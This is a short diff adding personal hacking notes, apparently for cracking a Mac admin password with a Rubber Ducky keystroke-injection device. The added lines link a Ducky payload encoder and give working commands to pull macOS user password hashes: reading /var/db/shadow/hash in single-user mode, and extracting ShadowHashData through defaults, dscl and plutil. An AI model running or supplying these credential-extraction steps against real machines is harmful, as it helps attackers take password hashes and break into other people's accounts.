@@ -22,3 +22,29 @@ wifi pineapple
 use in rubber ducky to crack admin password.
 http://www.hackmac.org/tutorials/decrypt-os-x-user-account-passwords/
 http://www.idownloadblog.com/2014/05/18/how-to-find-a-wi-fi-password-on-mac/
+
+https://ducktoolkit.com/encoder/   to encode
+dscl . -read /Users/cedge GeneratedUID is the code for guid.
+
+boot in single user mode
+cat /var/db/shadow/hash/<###INSERT GUID HERE###> | cut -c169-216
+
+
+
+
+The hashes of the users are stored in a different place since 10.7:
+
+/var/db/dslocal/nodes/Default/users/<user>.plist
+
+To get the shadow hash enter:
+
+sudo defaults read /var/db/dslocal/nodes/Default/users/<user>.plist ShadowHashData | tr -dc '0-9a-f ' | xxd -p -r | plutil -convert xml1 - -o -
+
+or directly through directory services:
+
+sudo dscl . read /Users/<user> AuthenticationAuthority
+
+and
+
+sudo dscl . read /Users/<user> dsAttrTypeNative:ShadowHashData
+
